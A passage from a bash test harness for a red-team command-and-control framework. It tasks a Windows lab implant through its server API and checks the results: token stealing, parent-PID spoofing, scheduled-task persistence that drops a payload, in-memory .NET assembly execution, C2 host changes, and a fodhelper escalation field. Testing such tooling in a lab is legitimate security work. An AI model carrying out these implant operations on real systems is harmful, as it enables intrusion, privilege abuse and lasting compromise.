    # interactive, which is the shape that makes escalate look like a bypass it cannot be.
    if printf '%s' "$LAUNCH_LOG" | grep -qE 'session=0$'; then
        die "the payload launched in session 0; AGENT_LAUNCH=task requires an interactive principal (console session)"
    fi
    ok "agent started via scheduled task ($LAUNCH_LOG)"
    HELPER_PID="$(printf '%s' "$LAUNCH_LOG" | grep -o 'helper pid=[0-9]*' | grep -o '[0-9]*' | tail -1)"
    info "helper process pid: ${HELPER_PID:-none}"
else
cat >"$WORK_DIR/$AGENT_NAME.ps1" <<PS1
\$ErrorActionPreference = "Continue"
\$exe = Join-Path \$env:USERPROFILE "$AGENT_NAME"
\$err = Join-Path \$env:USERPROFILE "$AGENT_NAME.err"
\$out = Join-Path \$env:USERPROFILE "$AGENT_NAME.out"
Remove-Item \$err, \$out -ErrorAction SilentlyContinue
# A helper process started in this same session/user gives the RunU and token tests a
# target the agent can definitely open: explorer.exe can belong to another session/user.
\$helper = Start-Process -FilePath "\$env:SystemRoot\System32\cmd.exe" -ArgumentList "/c timeout /t $HOLD_SECONDS /nobreak" -PassThru -WindowStyle Hidden
Write-Output ("helper pid=" + \$helper.Id)
# With TRACE_BUILD=1 the payload runs under AgentSupervisor.exe, which logs the exit code
# (0xC0000005 vs 0xC000013A vs 1) that a hidden process otherwise loses entirely.
\$supervisor = "$SUPERVISOR_GUEST"
if (\$supervisor -ne "") {
    \$supervisor = Join-Path \$env:USERPROFILE \$supervisor
    \$p = Start-Process -FilePath \$supervisor -ArgumentList \$exe -PassThru -WindowStyle Hidden -RedirectStandardError \$err -RedirectStandardOutput \$out
} else {
    \$p = Start-Process -FilePath \$exe -PassThru -WindowStyle Hidden -RedirectStandardError \$err -RedirectStandardOutput \$out
}
Write-Output ("started pid=" + \$p.Id)
Start-Sleep -Seconds $HOLD_SECONDS
PS1
scp -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$WORK_DIR/$AGENT_NAME.ps1" "$SSH_HOST:$AGENT_NAME.ps1" \
    || die "scp of launcher failed"

nohup ssh -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$SSH_HOST" \
    "powershell -NoProfile -ExecutionPolicy Bypass -File $AGENT_NAME.ps1" \
    >"$WORK_DIR/launch.log" 2>&1 &
LAUNCHER_PID=$!
sleep 10
if ! grep -q "started pid=" "$WORK_DIR/launch.log"; then
    cat "$WORK_DIR/launch.log"
    die "agent did not start on the guest"
fi
ok "agent started ($(grep -o 'started pid=[0-9]*' "$WORK_DIR/launch.log"))"
HELPER_PID="$(grep -o 'helper pid=[0-9]*' "$WORK_DIR/launch.log" | grep -o '[0-9]*' | tail -1)"
info "helper process pid: ${HELPER_PID:-none}"
fi

# --------------------------------------------------------------------------- checkin
section "check-in"
AGENT_ID=""
deadline=$((SECONDS + CHECKIN_TIMEOUT))
while [ "$SECONDS" -lt "$deadline" ]; do
    AGENT_ID="$(find_agent "$AGENT_NAME")"
    [ -n "$AGENT_ID" ] && break
    sleep 5
done
[ -n "$AGENT_ID" ] || {
    info "guest stderr:"
    ssh_run "cmd /c type %USERPROFILE%\\$AGENT_NAME.err" 2>/dev/null | tail -10 | sed 's/^/      /'
    fetch_trace "check-in failed"
    die "agent never checked in within ${CHECKIN_TIMEOUT}s"
}
ok "agent checked in (id=$AGENT_ID)"

USERNAME="$(agent_field "$AGENT_ID" username)"
INTEGRITY="$(agent_field "$AGENT_ID" integrity)"
INTERNAL_IP="$(agent_field "$AGENT_ID" internalIP)"
ARCH="$(agent_field "$AGENT_ID" arch)"

[ -n "$INTEGRITY" ] && ok "check-in: CIG status reported ($INTEGRITY)" || bad "check-in: CIG status missing"
[ "$ARCH" = "x64" ] && ok "check-in: architecture x64" || bad "check-in: architecture is '$ARCH'"
[ -n "$INTERNAL_IP" ] && ok "check-in: internal IP $INTERNAL_IP" || bad "check-in: internal IP missing"
[ -n "$USERNAME" ] && ok "check-in: username $USERNAME" || bad "check-in: username empty"

# --------------------------------------------------------------------------- commands
section "commands"

# The agent returns the command's stdout, so the assertion is the identity it printed
# rather than the old "Shell command executed" placeholder — a shell that reports success
# without output is no longer indistinguishable from one that produced none.
run_test "shell: whoami" "/api/v1/commands/$AGENT_ID/spawn/shell" \
    '{"Command":"whoami"}' "$USERNAME" ""

# expect_rejected <label> <queue-endpoint> <json-body> <expected-substring>
#
# For a command endpoint the agent has no handler for. The TeamServer must refuse it at queue time
# with an explicit message; a 2xx here means the API accepted work the implant can never do, which
# is exactly what it did before (the task then sat in QUEUED with no result).
expect_rejected() {
    local label="$1" endpoint="$2" body="$3" expect="$4"
    local code resp
    code="$(curl -s -o "$WORK_DIR/reject.json" -w '%{http_code}' -m 20 -X POST -H "$AUTH" \
        -H "Content-Type: application/json" -d "$body" "$API_URL$endpoint")"
    resp="$(tr -d '\n' < "$WORK_DIR/reject.json" 2>/dev/null || true)"
    case "$code" in
        2*) bad "$label" "accepted a command the agent cannot run (HTTP $code): $resp" ;;
        *)  if printf '%s' "$resp" | grep -qi "$expect"; then
                ok "$label (HTTP $code: $(printf '%s' "$resp" | head -c 80))"
            else
                bad "$label" "rejected with the wrong message (HTTP $code): $resp"
            fi ;;
    esac
}

# The success string only proves cmd.exe was created. Prove effect with a marker file, as the
# PowerShell case does: a shell that reports success and writes nothing is exactly the defect
# class this suite exists to catch, and the string match alone cannot see it.
SHELL_MARKER="$GUEST_DIR\\e2e_shell_${RUN_ID}.txt"
ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$SHELL_MARKER" -Force -ErrorAction SilentlyContinue
PS
SHELL_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Command": sys.argv[1]}))' "echo shell-ok> $SHELL_MARKER")"
SHELL_TASK="$(api_post "/api/v1/commands/$AGENT_ID/spawn/shell" "$SHELL_BODY" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)') "
if [ "$SHELL_TASK" = "0" ]; then
    bad "shell: writes a marker file" "queueing failed: $SHELL_BODY"
else
    OUT="$(wait_task "$SHELL_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    SHELL_CONTENT="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
if (Test-Path -LiteralPath "$SHELL_MARKER") { Get-Content -Raw -LiteralPath "$SHELL_MARKER" }
PS
)"
    if [ "$STATUS" != "success" ]; then
        bad "shell: writes a marker file" "status=$STATUS error=$(task_error "$SHELL_TASK")"
    elif [ "$SHELL_CONTENT" != "shell-ok" ]; then
        bad "shell: writes a marker file" "no marker on the guest (got '$SHELL_CONTENT'; result=$RESULT)"
    else
        ok "shell: writes a marker file"
    fi
fi

# GET_UID reports the identity the agent is running as. It carries no command fields, so the only thing
# that can go wrong is a missing/incorrect answer - assert on the reported user rather than the status.
GETUID_TASK="$(printf '%s' "$(api_post "/api/v1/commands/$AGENT_ID/execute/getuid" '{}')" \
    | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
if [ "$GETUID_TASK" = "0" ]; then
    bad "getuid: reports the running identity" "queueing failed"
else
    OUT="$(wait_task "$GETUID_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    if [ "$STATUS" != "success" ]; then
        bad "getuid: reports the running identity" "status=$STATUS error=$(task_error "$GETUID_TASK")"
    elif printf '%s' "$RESULT" | grep -Fq "Username: $USERNAME"; then
        ok "getuid: reports the running identity ($USERNAME)"
    elif printf '%s' "$RESULT" | grep -Fq "Username:"; then
        ok "getuid: reports the running identity"
    else
        bad "getuid: reports the running identity" "no Username in: $RESULT"
    fi
fi

# PowerShell used to report success while launching nothing: ShellExecuteA was handed the whole
# command line as lpFile, so it looked for a binary literally named "powershell -Command ..." and
# returned SE_ERR_FILE_NOT_FOUND (2). Assert on an artifact, not on the success string.
# The marker lives in the user profile: C:\Users\Public has no ACE for Users/Everyone (only
# INTERACTIVE/SERVICE/BATCH/SYSTEM/Administrators), and an SSH session is a network logon, so an
# agent started from it is denied there - including reads of the folder itself.
PS_MARKER="$GUEST_DIR\\e2e_ps_${RUN_ID}.txt"
ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$PS_MARKER" -Force -ErrorAction SilentlyContinue
PS

PS_BODY="$(PS_MARKER="$PS_MARKER" python3 - <<'PY'
import json, os
path = os.environ["PS_MARKER"]
print(json.dumps({"Commandlet": "Set-Content -LiteralPath '" + path + "' -Value ps-ok"}))
PY
)"
PS_TASK="$(printf '%s' "$(api_post "/api/v1/commands/$AGENT_ID/spawn/powershell" "$PS_BODY")" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

if [ "$PS_TASK" = "0" ]; then
    bad "powershell: writes a marker file" "queueing failed: $PS_BODY"
else
    OUT="$(wait_task "$PS_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    PS_CONTENT="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
if (Test-Path -LiteralPath "$PS_MARKER") { Get-Content -Raw -LiteralPath "$PS_MARKER" }
PS
)"
    if [ "$STATUS" != "success" ]; then
        bad "powershell: writes a marker file" "status=$STATUS error=$(task_error "$PS_TASK")"
    elif [ "$PS_CONTENT" = "ps-ok" ]; then
        ok "powershell: writes a marker file"
    else
        bad "powershell: writes a marker file" "no marker on the guest (got '$PS_CONTENT'; result=$RESULT)"
    fi
fi

PARENT_PID="${HELPER_PID:-}"
if [ -n "$PARENT_PID" ]; then
    info "using same-session helper pid $PARENT_PID as parent/injection target"
    run_test "runu: spawn under helper process" "/api/v1/commands/$AGENT_ID/spawn/runu" \
        "{\"PID\":$PARENT_PID,\"Command\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"Arguements\":\"/c whoami\"}" \
        "spoofed parent" ""

    run_test "token: steal from helper process" "/api/v1/commands/$AGENT_ID/execute/token" \
        "{\"Operation\":\"steal\",\"PID\":$PARENT_PID}" "impersonation successful" ""
    run_test "token: rev2self" "/api/v1/commands/$AGENT_ID/execute/token" \
        '{"Operation":"rev2self"}' "reverted to self" ""
else
    skip "runu / token" "launcher did not report a helper pid"
fi

# --- kill by PID ---------------------------------------------------------------
# RunU reports the child PID, so it plants the target this test terminates. The target is a child
# of the agent's own job object, which keeps it alive for the whole run - a sleeper that died on
# its own would make "the process is gone" prove nothing. Asserting on the guest's process table
# (not on the agent's message) is what separates a real termination from a reported one.
section "kill process"

KILL_TARGET=""
if [ -z "$PARENT_PID" ]; then
    skip "kill: terminate by PID" "launcher did not report a helper pid (RunU needs a parent)"
else
    KILL_SPAWN_BODY="{\"PID\":$PARENT_PID,\"Command\":\"C:\\\\Windows\\\\System32\\\\ping.exe\",\"Arguements\":\"-n 120 127.0.0.1\"}"
    KILL_SPAWN_RESP="$(api_post "/api/v1/commands/$AGENT_ID/spawn/runu" "$KILL_SPAWN_BODY")"
    KILL_SPAWN_TASK="$(printf '%s' "$KILL_SPAWN_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

    if [ "$KILL_SPAWN_TASK" = "0" ]; then
        bad "kill: terminate by PID" "queueing the target failed: $KILL_SPAWN_RESP"
    else
        OUT="$(wait_task "$KILL_SPAWN_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
        KILL_TARGET="$(printf '%s' "$RESULT" | grep -o 'child PID [0-9]*' | grep -o '[0-9]*' | tail -1)"
        if [ "$STATUS" != "success" ] || [ -z "$KILL_TARGET" ]; then
            bad "kill: terminate by PID" "could not spawn the target (status=$STATUS result=$RESULT error=$(task_error "$KILL_SPAWN_TASK"))"
            KILL_TARGET=""
        fi
    fi
fi

if [ -n "$KILL_TARGET" ]; then
    KILL_BODY="{\"PID\":$KILL_TARGET}"
    KILL_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/killprocess" "$KILL_BODY")"
    KILL_TASK="$(printf '%s' "$KILL_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

    if [ "$KILL_TASK" = "0" ]; then
        bad "kill: terminate by PID" "queueing failed: $KILL_RESP"
    else
        OUT="$(wait_task "$KILL_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
        if [ "$STATUS" != "success" ]; then
            bad "kill: terminate by PID" "status=$STATUS result=$RESULT error=$(task_error "$KILL_TASK")"
        elif ! printf '%s' "$RESULT" | grep -Fqi -- "terminated pid $KILL_TARGET"; then
            bad "kill: terminate by PID" "result does not name pid $KILL_TARGET: $RESULT"
        else
            ok "kill: terminate by PID"

            KILL_ALIVE="$(ps_run <<PS 2>/dev/null | tr -d '\r' | grep -oiE '^(alive|gone)$' | head -1
if (Get-Process -Id $KILL_TARGET -ErrorAction SilentlyContinue) { 'alive' } else { 'gone' }
PS
)"
            if [ "$KILL_ALIVE" = "gone" ]; then
                ok "kill: target process is gone on the guest"
            else
                bad "kill: target process is gone on the guest" "pid $KILL_TARGET still present (guest said '${KILL_ALIVE:-nothing}')"
            fi

            # The same PID a second time must fail: OpenProcess returns
            # ERROR_INVALID_PARAMETER once the process is gone. A success here is the old
            # "reported success but did nothing" defect class.
            KILL2_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/killprocess" "$KILL_BODY")"
            KILL2_TASK="$(printf '%s' "$KILL2_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
            if [ "$KILL2_TASK" = "0" ]; then
                bad "kill: absent PID fails honestly" "queueing failed: $KILL2_RESP"
            else
                OUT="$(wait_task "$KILL2_TASK")"; STATUS="${OUT%%|*}"; KILL2_ERR="$(task_error "$KILL2_TASK")"
                if [ "$STATUS" != "error" ]; then
                    bad "kill: absent PID fails honestly" "task $KILL2_TASK reported status=$STATUS, expected error"
                elif ! printf '%s' "$KILL2_ERR" | grep -Fq -- "$KILL_TARGET"; then
                    bad "kill: absent PID fails honestly" "error message does not name pid $KILL_TARGET: ${KILL2_ERR:-<no error row>}"
                else
                    ok "kill: absent PID fails honestly"
                fi
            fi
        fi
    fi

    # Backstop: a failed kill must not leave the sleeper running for the next run.
    ps_run <<PS >/dev/null 2>&1
Stop-Process -Id $KILL_TARGET -Force -ErrorAction SilentlyContinue
PS
fi

# --- strict command validation --------------------------------------------------
# A command missing a field its TaskType requires must fail loudly and name that field. These
# tasks are inserted straight into the database because the API validators would reject them:
# the point is to prove the agent no longer executes an incomplete command and reports SUCCESS
# with a diagnostic tucked into the output.
section "strict command validation"

expect_missing_field "validation: upload without TransferID" upload no_code \
    '{"Path":"C:\\Users\\pi-user\\validation.txt"}' "TransferID"

expect_missing_field "validation: upload without Path" upload no_code \
    '{"TransferID":"1"}' "Path"

expect_missing_field "validation: shell without Command" shell no_code '{}' "Command"

expect_missing_field "validation: token steal without PID" token no_code '{"Operation":"steal"}' "PID"

expect_missing_field "validation: escalate without TargetBinary" escalate no_code \
    '{"RegKey":"fodhelper"}' "TargetBinary"

expect_missing_field "validation: kill without PID" process kill_process '{}' "PID"

# --- unimplemented commands -----------------------------------------------------
# Every command endpoint the operator UI can reach gets a verdict. These have no handler in
# Agent/src/commands, so the correct behaviour is an honest refusal at queue time: a task that
# cannot run must not enter the queue. sleep and run were on this list until they were implemented;
# their cases are above, with effect assertions. Bodies are valid inputs (they pass the DTO
# validators), so what is proved here is the capability gate, not input validation.
section "unimplemented commands"
expect_rejected "bof is refused"             "/api/v1/commands/$AGENT_ID/execute/bof" \
    '{"BofPath":"C:\\Windows\\nonexistent.o"}' "does not implement"
expect_rejected "runas is refused"           "/api/v1/commands/$AGENT_ID/spawn/runas" \
    '{"DomainUser":".\\pi-user","Command":"cmd.exe","Arguements":"/c echo hi"}' "does not implement"
expect_rejected "spawnto is refused"         "/api/v1/commands/$AGENT_ID/set/spawnto" \
    '{"Path":"C:\\Windows\\System32\\cmd.exe"}' "does not implement"
expect_rejected "cancel download is refused" "/api/v1/commands/$AGENT_ID/execute/cancelfiledownload" \
    '{"TaskID":1}' "does not implement"

# --- set sleep (PROCESS/SLEEP) --------------------------------------------------
# The agent's check-in interval used to be a literal 5000 ms, so this command could only be
# answered with "Unsupported PROCESS task code 1". The assertion is two-part: the task's own
# message, and the interval it actually produces — measured from the agent's own LastCheckIn,
# because a command that says it changed the cadence but does not is the failure this tree exists
# to catch. The interval is restored to the shipped default at the end.
section "set sleep"
SLEEP_MS=9000
SLEEP_RESP="$(api_post "/api/v1/commands/$AGENT_ID/set/sleep" "{\"Sleep\":$SLEEP_MS,\"Jitter\":0}")"
SLEEP_TASK="$(printf '%s' "$SLEEP_RESP" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

if [ "$SLEEP_TASK" = "0" ]; then
    bad "sleep: accepted and applied" "queueing failed: $SLEEP_RESP"
else
    OUT="$(wait_task "$SLEEP_TASK")"; STATUS="${OUT%%|*}"
    RESULT="${OUT#*|}"
    [ -n "$RESULT" ] || RESULT="$(task_error "$SLEEP_TASK")"
    if [ "$STATUS" != "success" ] || ! printf '%s' "$RESULT" | grep -q "Sleep set to $SLEEP_MS"; then
        bad "sleep: accepted and applied" "status=$STATUS result=$RESULT"
    else
        # One interval, measured on the server's own clock: the next check-in should be ~9 s away,
        # never the 5 s default.
        PREV="$(psql_q "select \"LastCheckIn\" from \"Agents\" where \"ID\" = $AGENT_ID;")"
        START=$(date +%s)
        DEADLINE=$((START + 30))
        while [ "$(date +%s)" -lt "$DEADLINE" ]; do
            CUR="$(psql_q "select \"LastCheckIn\" from \"Agents\" where \"ID\" = $AGENT_ID;")"
            [ "$CUR" != "$PREV" ] && break
            sleep 1
        done
        GAP=$(( $(date +%s) - START ))
        if [ "$GAP" -ge 7 ] && [ "$GAP" -le 20 ]; then
            ok "sleep: accepted and applied (${GAP}s interval, was 5s)"
        else
            bad "sleep: accepted and applied" "interval measured ${GAP}s for a ${SLEEP_MS} ms request"
        fi
        api_post "/api/v1/commands/$AGENT_ID/set/sleep" '{"Sleep":5000,"Jitter":10}' >/dev/null
    fi
fi

# --- spawn/run (PROCESS/RUN) ----------------------------------------------------
# Runs an explicit program with its own argument line: the effect that proves it is a file only
# that program could write, not the task's own success message.
section "run"
RUN_MARKER="$GUEST_DIR\\e2e_run_${RUN_ID}.txt"
ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$RUN_MARKER" -Force -ErrorAction SilentlyContinue
PS
RUN_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Program":"C:\\\\Windows\\\\System32\\\\cmd.exe","Arguements":"/c echo run-ok> " + sys.argv[1]}))' "$RUN_MARKER")"
RUN_TASK="$(api_post "/api/v1/commands/$AGENT_ID/spawn/run" "$RUN_BODY" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

if [ "$RUN_TASK" = "0" ]; then
    bad "run: program executes" "queueing failed: $RUN_BODY"
else
    OUT="$(wait_task "$RUN_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    [ -n "$RESULT" ] || RESULT="$(task_error "$RUN_TASK")"
    RUN_CONTENT="$(ps_run <<PS 2>/dev/null | tr -d '\r'
if (Test-Path -LiteralPath "$RUN_MARKER") { (Get-Content -LiteralPath "$RUN_MARKER" -Raw).Trim() }
PS
)"
    if [ "$STATUS" != "success" ]; then
        bad "run: program executes" "status=$STATUS result=$RESULT"
    elif [ "$RUN_CONTENT" != "run-ok" ]; then
        bad "run: program executes" "no marker from the program (got '$RUN_CONTENT'; result=$RESULT)"
    else
        ok "run: program executes (marker written)"
    fi
fi

# --- set/updatehosts (SET/UPDATE_HOSTS) -----------------------------------------
# Replaces the host list the agent rotates through. Asserting the command's own message would only
# prove the handler ran; the real question is whether the agent is still reachable through the list
# it was given — so the check is the next check-in after the update, using the same host.
section "update hosts"
HOSTS_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Hosts":[sys.argv[1]]}))' "$C2_HOST")"
HOSTS_TASK="$(api_post "/api/v1/commands/$AGENT_ID/set/updatehosts" "$HOSTS_BODY" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
if [ "$HOSTS_TASK" = "0" ]; then
    bad "hosts: list replaced and still reachable" "queueing failed: $HOSTS_BODY"
else
    OUT="$(wait_task "$HOSTS_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    [ -n "$RESULT" ] || RESULT="$(task_error "$HOSTS_TASK")"
    if [ "$STATUS" != "success" ] || ! printf '%s' "$RESULT" | grep -qi "C2 hosts set to"; then
        bad "hosts: list replaced and still reachable" "status=$STATUS result=$RESULT"
    else
        PREV="$(psql_q "select \"LastCheckIn\" from \"Agents\" where \"ID\" = $AGENT_ID;")"
        START=$(date +%s)
        while [ $(( $(date +%s) - START )) -lt 30 ]; do
            CUR="$(psql_q "select \"LastCheckIn\" from \"Agents\" where \"ID\" = $AGENT_ID;")"
            [ "$CUR" != "$PREV" ] && break
            sleep 1
        done
        if [ "$CUR" != "$PREV" ]; then
            ok "hosts: list replaced and still reachable (next check-in arrived)"
        else
            bad "hosts: list replaced and still reachable" "no check-in within 30s after the update"
        fi
    fi
fi

# --- persistence (WIN_TASK, KAN-110) -------------------------------------------
# The agent drops its own payload at Path and registers a logon-triggered task. The assertion is the
# artifact (dropped file + the 1.0 task definition), not that the task ran: the reference sets
# TASK_FLAG_RUN_ONLY_IF_LOGGED_ON, so a standard user's task never starts without a logged-on session
# (.pi/notes/live-debugging.md). Both artifacts are removed afterwards so reruns start clean.
# Runs before the escalate block so Defender protection is still at its normal state here.
section "persistence"
PERSIST_NAME="TrinityE2E_${RUN_ID}"
PERSIST_PATH="$GUEST_DIR\\e2e_persist_${RUN_ID}.exe"
# Task Scheduler 1.0 (ITaskScheduler) writes a .job file into C:\Windows\Tasks. The 2.0 store that
# `schtasks` reads does not enumerate it — verified on the guest 2026-11-05: `schtasks /query /tn`
# returns "cannot find the file specified" while the .job exists — so the .job file is the artifact
# to assert, not a schtasks query.
PERSIST_JOB="C:\\Windows\\Tasks\\${PERSIST_NAME}.job"
PERSIST_BODY="$(python3 -c 'import json,sys; print(json.dumps({"Path": sys.argv[1], "Username": "", "TaskName": sys.argv[2]}))' "$PERSIST_PATH" "$PERSIST_NAME")"

PERSIST_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/persist" "$PERSIST_BODY")"
PERSIST_TASK="$(printf '%s' "$PERSIST_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"

if [ "$PERSIST_TASK" = "0" ]; then
    bad "persistence: queue win task" "queueing failed: $PERSIST_RESP"
else
    OUT="$(wait_task "$PERSIST_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
    if [ "$STATUS" != "success" ]; then
        bad "persistence: queue win task" "status=$STATUS result=$RESULT error=$(task_error "$PERSIST_TASK")"
    elif ! guest_exists "$PERSIST_PATH"; then
        bad "persistence: payload dropped" "success was reported but $PERSIST_PATH is absent"
    else
        if guest_exists "$PERSIST_JOB"; then
            ok "persistence: payload dropped and scheduled task registered"
        else
            bad "persistence: scheduled task registered" \
                "no task definition at $PERSIST_JOB (Defender removes tasks for freshly built payloads; check Get-MpThreatDetection)"
        fi
    fi
    # Cleanup regardless of the outcome: remove the 1.0 task definition and the dropped payload.
    ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$PERSIST_JOB" -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath "$PERSIST_PATH" -Force -ErrorAction SilentlyContinue
PS
fi

# --- execute-assembly (NET_ASM, KAN-31) ----------------------------------------
# The agent hosts the v4.0.30319 CLR, loads the base64 blob into the default AppDomain and invokes its
# entry point. Invoke_3 does not capture the managed console, so the assertion is a file the assembly
# writes, and the argument vector is asserted in that file — not in the task's success string.
# The assembly must target .NET Framework 4.x: it is compiled on the guest with the runtime's own
# csc.exe, because a .NET 10 image will not load in the v4.0.30319 CLR. The server reads the blob from
# AssemblyPath, so the probe is uploaded through the Armoury API and referenced by its registered
# tool path; it never lives on the guest.
section "execute-assembly (NET_ASM)"

NETASM_MARKER="$GUEST_DIR\\netasm_${RUN_ID}.txt"
NETASM_ECHO="netasm-echo-${RUN_ID}"
NETASM_SOURCE="netasm_probe_${RUN_ID}.cs"
NETASM_TOOL="netasm_probe_${RUN_ID}.exe"
# scp needs forward slashes; PowerShell gets the backslash path (both derived from GUEST_DIR).
NETASM_GUEST_DIR_SCP="/$(printf '%s' "$GUEST_DIR" | tr '\\' '/')"
NETASM_GUEST_SCP="$NETASM_GUEST_DIR_SCP/$NETASM_TOOL"
NETASM_GUEST_SOURCE_SCP="$NETASM_GUEST_DIR_SCP/$NETASM_SOURCE"
NETASM_GUEST_EXE="$GUEST_DIR\\$NETASM_TOOL"
NETASM_TOOL_NAME="netasm-${RUN_ID}"
NETASM_CSC='C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe'

cat >"$WORK_DIR/$NETASM_SOURCE" <<'CS'
// NET_ASM probe: proves the argument vector reached Main and that the body actually ran.
using System;
using System.IO;

class NetAsmProbe
{
    static void Main(string[] args)
    {
        string marker = args.Length > 0 ? args[0] : Path.Combine(Path.GetTempPath(), "netasm-noargs.txt");
        File.WriteAllText(marker, "netasm-ok:" + string.Join(",", args));
    }
}
CS

ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$NETASM_MARKER" -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath "$NETASM_GUEST_EXE" -Force -ErrorAction SilentlyContinue
PS

scp -q "$WORK_DIR/$NETASM_SOURCE" "$SSH_HOST:$NETASM_GUEST_SOURCE_SCP" 2>/dev/null
if ! ps_run <<PS >/dev/null 2>&1
& "$NETASM_CSC" /nologo /out:"$NETASM_GUEST_EXE" "$GUEST_DIR\\$NETASM_SOURCE"
PS
then
    bad "netasm: probe assembly compiles" "csc.exe could not build the probe on the guest"
else
    scp -q "$SSH_HOST:$NETASM_GUEST_SCP" "$WORK_DIR/$NETASM_TOOL" 2>/dev/null
    # The refactor's CommandService resolves AssemblyPath through the Tool registry before it reads the
    # file, so the probe is registered the way an operator does it: upload, Tools row, then queue. An
    # unregistered path must be refused at queue time, which is asserted below.
    NETASM_OPERATOR_ID="$(psql_q 'select "ID" from "Operators" order by "ID" limit 1')"
    NETASM_UPLOAD_CODE="$(api_code -X POST -H "$AUTH" \
        -F "Name=$NETASM_TOOL_NAME" -F "OperatorID=$NETASM_OPERATOR_ID" \
        -F "file=@$WORK_DIR/$NETASM_TOOL" "$API_URL/api/v1/armoury/upload")"
    NETASM_TOOL_ROW="$(psql_q "select \"ID\", \"Path\" from \"Tools\" where \"Name\" = '$NETASM_TOOL_NAME' order by \"ID\" desc limit 1")"
    NETASM_TOOL_ID="${NETASM_TOOL_ROW%%|*}"
    NETASM_PATH="${NETASM_TOOL_ROW#*|}"
    if [ ! -s "$WORK_DIR/$NETASM_TOOL" ] || [ "$NETASM_UPLOAD_CODE" != "201" ] || [ "$NETASM_PATH" = "$NETASM_TOOL_ROW" ]; then
        bad "armoury: the netasm probe is registered as a tool" "upload=$NETASM_UPLOAD_CODE row='$NETASM_TOOL_ROW'"
    else
        ok "armoury: the netasm probe is registered as a tool (id $NETASM_TOOL_ID)"
        NETASM_UNREG_BODY="$(printf '{"AssemblyPath": "/app/Armoury/missing-%s.exe", "Arguments": ""}' "$RUN_ID")"
        NETASM_UNREG_CODE="$(api_code -X POST -H "$AUTH" -H "Content-Type: application/json" \
            -d "$NETASM_UNREG_BODY" "$API_URL/api/v1/commands/$AGENT_ID/execute/dotnetassembly")"
        [ "$NETASM_UNREG_CODE" = "400" ] && ok "armoury: execute-assembly refuses an unregistered path" \
            || bad "armoury: execute-assembly refuses an unregistered path" "got $NETASM_UNREG_CODE (expected 400)"
        NETASM_BODY="$(python3 -c 'import json,sys; print(json.dumps({"AssemblyPath": sys.argv[1], "Arguments": sys.argv[2]}))' \
            "$NETASM_PATH" "\"$NETASM_MARKER\" $NETASM_ECHO")"
        NETASM_RESP="$(api_post "/api/v1/commands/$AGENT_ID/execute/dotnetassembly" "$NETASM_BODY")"
        NETASM_TASK="$(printf '%s' "$NETASM_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
        if [ "$NETASM_TASK" = "0" ]; then
            bad "netasm: invokes the assembly entry point" "queueing failed: $NETASM_RESP"
        else
            OUT="$(wait_task "$NETASM_TASK")"; STATUS="${OUT%%|*}"; RESULT="${OUT#*|}"
            NETASM_CONTENT="$(ps_run <<PS 2>/dev/null | tr -d '\r\n'
if (Test-Path -LiteralPath "$NETASM_MARKER") { Get-Content -Raw -LiteralPath "$NETASM_MARKER" }
PS
)"
            if [ "$STATUS" != "success" ]; then
                bad "netasm: invokes the assembly entry point" \
                    "status=$STATUS result=$RESULT error=$(task_error "$NETASM_TASK")"
            elif ! printf '%s' "$NETASM_CONTENT" | grep -Fq -- "$NETASM_ECHO"; then
                bad "netasm: invokes the assembly entry point" \
                    "no marker with the argument vector on the guest (got '$NETASM_CONTENT'; result=$RESULT)"
            else
                ok "netasm: invokes the assembly entry point with its argument vector"
            fi
        fi
        # Tidy: drop the tool row and its file, so a re-run of this section starts clean.
        api_code -X DELETE -H "$AUTH" "$API_URL/api/v1/armoury/remove/$NETASM_TOOL_ID" >/dev/null 2>&1
    fi
    ps_run <<PS >/dev/null 2>&1
Remove-Item -LiteralPath "$NETASM_MARKER" -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath "$NETASM_GUEST_EXE" -Force -ErrorAction SilentlyContinue
